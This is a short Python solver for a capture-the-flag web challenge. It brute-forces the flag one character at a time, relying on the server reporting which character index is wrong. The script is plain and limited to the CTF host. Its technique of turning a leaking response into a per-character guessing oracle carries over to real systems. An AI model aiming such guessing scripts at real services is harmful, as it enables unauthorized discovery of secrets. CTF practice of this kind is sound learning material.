import requests
import time

charset = "abcdefghijklmnopqrstuvwxyz0123456789_"

prefix="CTFR{"
postfix = "}"
bruteforcelength = 36 - (len(prefix)+len(postfix))
keylist=[]
keysnumbers=[]
keystring=""
currentlength=0
trial=0

def send(key):
	r = requests.get("https://web.ctf.rasyidmf.com/chal16/?flag="+prefix+key+postfix)
	return r

def listToString(lists):
	string=""
	for x in lists:
		string+=x
	return string

def stringToList(string):
	return list(string)

def initial():
	for x in range(bruteforcelength):
		keylist.append("a")
		keysnumbers.append(0)


def solve():
	while(True):
		temp = send(listToString(keylist))
		temptext = temp.text
		print(temptext)
		if "Karakter pada index" in temptext:
			templist = temptext.split("<b>")
			templist = templist[1].split("</b>")
			indexnumber = int(templist[0])-5
		elif "Here is your flag" in temptext:
			break
		keysnumbers[indexnumber]+=1
		keylist[indexnumber]=charset[keysnumbers[indexnumber]]
		print (indexnumber)
		time.sleep(0.01)

initial()
solve()
